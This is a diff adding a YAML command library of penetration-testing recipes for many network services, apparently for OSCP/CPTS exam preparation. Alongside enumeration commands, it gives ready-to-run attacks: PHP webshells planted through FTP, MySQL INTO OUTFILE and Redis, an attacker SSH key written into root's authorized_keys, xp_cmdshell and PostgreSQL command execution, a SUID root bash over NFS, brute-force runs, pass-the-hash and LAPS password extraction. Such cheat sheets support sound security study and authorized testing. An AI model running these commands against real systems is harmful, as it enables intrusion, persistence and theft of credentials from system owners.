@@ -1,0 +1,448 @@
+category: "services"
+description: "Service enumeration and exploitation — from discovery to attack chains"
+commands:
+
+  # ─── FTP ───
+
+  - name: "ftp-anonymous"
+    description: "Check FTP anonymous login"
+    command: "ftp {IP} # login as anonymous:anonymous"
+    tool: "ftp"
+    tags: ["ftp", "anonymous", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "ftp-nmap-scripts"
+    description: "FTP NSE script enumeration"
+    command: "nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 {IP}"
+    tool: "nmap"
+    tags: ["ftp", "nmap", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "ftp-nmap-vuln"
+    description: "Nmap FTP vulnerability scan"
+    command: "nmap -sV -p 21 --script ftp-* {IP}"
+    tool: "nmap"
+    tags: ["ftp", "nmap", "vuln"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "ftp-upload-webshell"
+    description: "Upload webshell via anonymous FTP"
+    command: "ftp {IP} # anonymous login, then: put shell.php"
+    tool: "ftp"
+    tags: ["ftp", "upload", "webshell", "exploit"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "If FTP allows anonymous upload AND maps to web root, upload a PHP shell. Test with 'put test.txt' first."
+
+  - name: "ftp-vsftpd-backdoor"
+    description: "Exploit vsFTPd 2.3.4 backdoor"
+    command: "nmap --script ftp-vsftpd-backdoor -p 21 {IP}"
+    tool: "nmap"
+    tags: ["ftp", "vsftpd", "backdoor", "exploit"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "vsFTPd 2.3.4 backdoor — username ending with :) triggers shell on port 6200"
+
+  # ─── SSH ───
+
+  - name: "ssh-brute-hydra"
+    description: "SSH brute force with Hydra"
+    command: "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{IP} -t 4"
+    tool: "hydra"
+    tags: ["ssh", "brute", "hydra"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Use -t 4 to limit threads (SSH rate limiting)"
+
+  - name: "ssh-id-rsa"
+    description: "SSH login with private key"
+    command: "chmod 600 id_rsa; ssh -i id_rsa {USER}@{IP}"
+    tool: "ssh"
+    tags: ["ssh", "key", "login"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  # ─── DNS ───
+
+  - name: "dns-zone-transfer"
+    description: "DNS zone transfer attempt"
+    command: "dig axfr @{IP} {DOMAIN}"
+    tool: "dig"
+    tags: ["dns", "zone", "transfer"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "dns-enum"
+    description: "DNS enumeration with dig"
+    command: "dig any {DOMAIN} @{IP}"
+    tool: "dig"
+    tags: ["dns", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  # ─── SMTP ───
+
+  - name: "smtp-user-enum"
+    description: "SMTP user enumeration"
+    command: "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t {IP}"
+    tool: "smtp-user-enum"
+    tags: ["smtp", "users", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  # ─── LDAP ───
+
+  - name: "ldap-windapsearch-users"
+    description: "Enumerate domain users via LDAP"
+    command: "python3 windapsearch.py -d {DOMAIN} --dc-ip {IP} -U"
+    tool: "windapsearch"
+    tags: ["ldap", "users", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Also try -G for groups, -C for computers, -PU for privileged users"
+
+  - name: "ldap-domaindump"
+    description: "Full LDAP domain dump to HTML/JSON"
+    command: "ldapdomaindump -u '{DOMAIN}\\{USER}' -p '{PASSWORD}' ldap://{IP} -o loot/"
+    tool: "ldapdomaindump"
+    tags: ["ldap", "dump", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Outputs domain_users/groups/computers/policy as HTML and JSON in loot/"
+
+  - name: "ldap-laps-extract"
+    description: "Extract LAPS passwords via LDAP"
+    command: "nxc ldap {IP} -u {USER} -p '{PASSWORD}' -M laps"
+    tool: "nxc"
+    tags: ["ldap", "laps", "password"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Requires authenticated user with LAPS read permissions"
+
+  - name: "ldap-auth-search"
+    description: "Authenticated LDAP user/group query"
+    command: "ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASSWORD}' -b 'DC=YOURDOMAIN,DC=LOCAL' '(objectClass=user)' sAMAccountName memberOf"
+    tool: "ldapsearch"
+    tags: ["ldap", "users", "groups", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Replace DC= components with actual domain parts"
+
+  # ─── SNMP ───
+
+  - name: "snmp-walk"
+    description: "SNMP walk with default community strings"
+    command: "snmpwalk -v2c -c public {IP}"
+    tool: "snmpwalk"
+    tags: ["snmp", "enum", "walk"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "snmp-brute"
+    description: "SNMP community string brute force"
+    command: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {IP}"
+    tool: "onesixtyone"
+    tags: ["snmp", "brute"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "snmp-processes"
+    description: "Enumerate running processes via SNMP"
+    command: "snmpwalk -v2c -c public {IP} 1.3.6.1.2.1.25.4.2.1.2"
+    tool: "snmpwalk"
+    tags: ["snmp", "processes", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "hrSWRunName OID — lists all running process names"
+
+  - name: "snmp-software"
+    description: "Enumerate installed software via SNMP"
+    command: "snmpwalk -v2c -c public {IP} 1.3.6.1.2.1.25.6.3.1.2"
+    tool: "snmpwalk"
+    tags: ["snmp", "software", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "hrSWInstalledName OID — lists installed software with versions"
+
+  - name: "snmp-interfaces"
+    description: "Enumerate network interfaces via SNMP"
+    command: "snmpwalk -v2c -c public {IP} 1.3.6.1.2.1.4.20.1.1"
+    tool: "snmpwalk"
+    tags: ["snmp", "interfaces", "network", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Shows all IP addresses on all interfaces — reveals dual-homed hosts"
+
+  - name: "snmp-users"
+    description: "Enumerate Windows user accounts via SNMP"
+    command: "snmpwalk -v2c -c public {IP} 1.3.6.1.4.1.77.1.2.25"
+    tool: "snmpwalk"
+    tags: ["snmp", "users", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Windows-specific user account OID (enterprises.77)"
+
+  - name: "snmp-bulkwalk"
+    description: "Fast full SNMP MIB walk"
+    command: "snmpbulkwalk -v2c -c public {IP}"
+    tool: "snmpbulkwalk"
+    tags: ["snmp", "enum", "bulk"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Faster than snmpwalk for large MIB trees — uses GETBULK requests"
+
+  - name: "snmp-check"
+    description: "All-in-one SNMP enumeration"
+    command: "snmp-check {IP}"
+    tool: "snmp-check"
+    tags: ["snmp", "enum", "check"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Auto-enumerates system info, users, processes, software, network, storage"
+
+  # ─── NFS ───
+
+  - name: "nfs-showmount"
+    description: "Show NFS exports"
+    command: "showmount -e {IP}"
+    tool: "showmount"
+    tags: ["nfs", "enum", "mount"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "nfs-mount"
+    description: "Mount NFS share"
+    command: "mkdir /mnt/nfs; mount -t nfs {IP}:/share /mnt/nfs -o nolock"
+    tool: "mount"
+    tags: ["nfs", "mount"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "nfs-no-root-squash"
+    description: "Exploit NFS no_root_squash for privilege escalation"
+    command: "mount -t nfs {IP}:/share /mnt/nfs -o nolock; cp /bin/bash /mnt/nfs/rootbash; chmod +s /mnt/nfs/rootbash"
+    tool: "mount"
+    tags: ["nfs", "root_squash", "privesc", "exploit"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "If /etc/exports shows no_root_squash: mount as root, create SUID bash, run ./rootbash -p on target"
+
+  - name: "nfs-uid-spoof"
+    description: "NFS access via UID/GID spoofing"
+    command: "nfspy -o server={IP}:/share,nfsport=2049,rw /mnt/nfs"
+    tool: "nfspy"
+    tags: ["nfs", "uid", "spoof", "exploit"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Spoofs UID/GID to bypass NFS access controls without needing no_root_squash"
+
+  # ─── MSSQL ───
+
+  - name: "mssql-impacket"
+    description: "MSSQL client with Impacket"
+    command: "impacket-mssqlclient {DOMAIN}/{USER}:{PASSWORD}@{IP} -windows-auth"
+    tool: "impacket"
+    tags: ["mssql", "database", "shell"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Once in: enable_xp_cmdshell, xp_cmdshell 'whoami'"
+
+  - name: "sqlcmd-connect"
+    description: "Connect to MSSQL using sqlcmd"
+    command: "sqlcmd -S {IP} -U {USER} -P {PASSWORD}"
+    tool: "sqlcmd"
+    tags: ["sql", "mssql", "database"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "mssql-xp-cmdshell"
+    description: "Enable and execute xp_cmdshell for OS command execution"
+    command: "impacket-mssqlclient {DOMAIN}/{USER}:{PASSWORD}@{IP} -windows-auth -q \"EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';\""
+    tool: "impacket"
+    tags: ["mssql", "database", "rce", "xp_cmdshell"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Full xp_cmdshell enable + execute chain. Requires SA or sysadmin role."
+
+  - name: "mssql-default-creds"
+    description: "Try MSSQL default credentials (sa with blank password)"
+    command: "nxc mssql {IP} -u sa -p '' --local-auth"
+    tool: "nxc"
+    tags: ["mssql", "database", "default", "creds"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Also try sa:sa, sa:Password1, sa:password"
+
+  # ─── MySQL ───
+
+  - name: "mysql-connect"
+    description: "MySQL remote connection"
+    command: "mysql -h {IP} -u {USER} -p"
+    tool: "mysql"
+    tags: ["mysql", "database"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "mysql-load-file"
+    description: "Read arbitrary files via MySQL LOAD_FILE"
+    command: "mysql -h {IP} -u {USER} -p'{PASSWORD}' -e \"SELECT LOAD_FILE('/etc/passwd');\""
+    tool: "mysql"
+    tags: ["mysql", "database", "lfi", "read"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Requires FILE privilege. Read arbitrary files from the server."
+
+  - name: "mysql-into-outfile"
+    description: "Write webshell via MySQL INTO OUTFILE"
+    command: "mysql -h {IP} -u {USER} -p'{PASSWORD}' -e \"SELECT '<?php system(\\$_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php';\""
+    tool: "mysql"
+    tags: ["mysql", "database", "rce", "webshell"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Requires FILE privilege and write access to web root."
+
+  - name: "mysql-default-creds"
+    description: "Try MySQL default credentials"
+    command: "nxc mysql {IP} -u root -p '' --local-auth"
+    tool: "nxc"
+    tags: ["mysql", "database", "default", "creds"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Also try root:root, root:mysql, root:toor"
+
+  # ─── PostgreSQL ───
+
+  - name: "postgres-copy-rce"
+    description: "PostgreSQL OS command execution via COPY TO PROGRAM"
+    command: "psql -h {IP} -U {USER} -c \"COPY (SELECT '') TO PROGRAM 'id';\""
+    tool: "psql"
+    tags: ["postgres", "database", "rce", "copy"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Requires superuser role. PostgreSQL 9.3+. Replace 'id' with reverse shell."
+
+  - name: "postgres-default-creds"
+    description: "Try PostgreSQL default credentials"
+    command: "psql -h {IP} -U postgres -c \"SELECT version();\""
+    tool: "psql"
+    tags: ["postgres", "database", "default", "creds"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Try postgres with no password, then postgres:postgres"
+
+  # ─── Redis ───
+
+  - name: "redis-cli"
+    description: "Redis CLI connection"
+    command: "redis-cli -h {IP}"
+    tool: "redis-cli"
+    tags: ["redis", "database"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Try: INFO, CONFIG GET *, keys *"
+
+  - name: "redis-webshell"
+    description: "Write PHP webshell via Redis CONFIG SET"
+    command: "redis-cli -h {IP} CONFIG SET dir /var/www/html; redis-cli -h {IP} CONFIG SET dbfilename shell.php; redis-cli -h {IP} SET payload '<?php system($_GET[cmd]); ?>'; redis-cli -h {IP} SAVE"
+    tool: "redis-cli"
+    tags: ["redis", "webshell", "rce"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Requires CONFIG access + web root writable by Redis user. Writes PHP shell via DB dump."
+
+  - name: "redis-ssh-key"
+    description: "Write SSH public key to authorized_keys via Redis"
+    command: "redis-cli -h {IP} CONFIG SET dir /root/.ssh; redis-cli -h {IP} CONFIG SET dbfilename authorized_keys; redis-cli -h {IP} SET key '\\n\\nssh-rsa AAAA...your_key...\\n\\n'; redis-cli -h {IP} SAVE"
+    tool: "redis-cli"
+    tags: ["redis", "ssh", "key", "rce"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Writes attacker SSH public key to root authorized_keys. Generate key first: ssh-keygen -t rsa"
+
+  - name: "redis-module-rce"
+    description: "Load malicious Redis module for command execution"
+    command: "redis-cli -h {IP} MODULE LOAD /path/to/module.so; redis-cli -h {IP} system.exec 'id'"
+    tool: "redis-cli"
+    tags: ["redis", "module", "rce"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Use RedisModules-ExecuteCommand .so module. Requires MODULE LOAD privilege."
+
+  # ─── RPC ───
+
+  - name: "rpcbind-enum"
+    description: "RPC enumeration"
+    command: "rpcinfo -p {IP}"
+    tool: "rpcinfo"
+    tags: ["rpc", "enum"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  # ─── SMB ───
+
+  - name: "smb-psexec"
+    description: "Impacket PsExec shell"
+    command: "impacket-psexec {DOMAIN}/{USER}:{PASSWORD}@{IP}"
+    tool: "impacket-psexec"
+    tags: ["smb", "shell", "psexec"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  # ─── RDP ───
+
+  - name: "rdp-nmap-enum"
+    description: "Nmap RDP vulnerability and enum scan"
+    command: "nmap -sV --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info {IP} -p 3389"
+    tool: "nmap"
+    tags: ["rdp", "nmap", "enum"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "rdp-medusa-brute"
+    description: "Bruteforce RDP using Medusa"
+    command: "medusa -u {USER} -P {PASS_FILE} -h {IP} -M rdp"
+    tool: "medusa"
+    tags: ["rdp", "brute"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  # ─── WinRM ───
+
+  - name: "winrm-evil-creds"
+    description: "Evil-WinRM shell with credentials"
+    command: "evil-winrm -i {IP} -u {USER} -p '{PASSWORD}'"
+    tool: "evil-winrm"
+    tags: ["winrm", "shell", "creds"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Default port 5985 (HTTP). Use -S for 5986 (HTTPS)."
+
+  - name: "winrm-evil-hash"
+    description: "Evil-WinRM shell with Pass-the-Hash"
+    command: "evil-winrm -i {IP} -u {USER} -H {HASH}"
+    tool: "evil-winrm"
+    tags: ["winrm", "shell", "pth"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Use NTLM hash without colon prefix"
+
+  - name: "winrm-evil-key"
+    description: "Evil-WinRM shell with SSH key"
+    command: "evil-winrm -i {IP} -u {USER} -k id_rsa -S"
+    tool: "evil-winrm"
+    tags: ["winrm", "shell", "key"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "-S for SSL (port 5986). Omit -S for HTTP (5985)."
+
+  - name: "winrm-ps-remoting"
+    description: "PowerShell remoting session"
+    command: "Enter-PSSession -ComputerName {IP} -Credential {DOMAIN}\\{USER}"
+    tool: "powershell"
+    tags: ["winrm", "shell", "powershell"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Run from a Windows pivot. Prompts for password interactively."
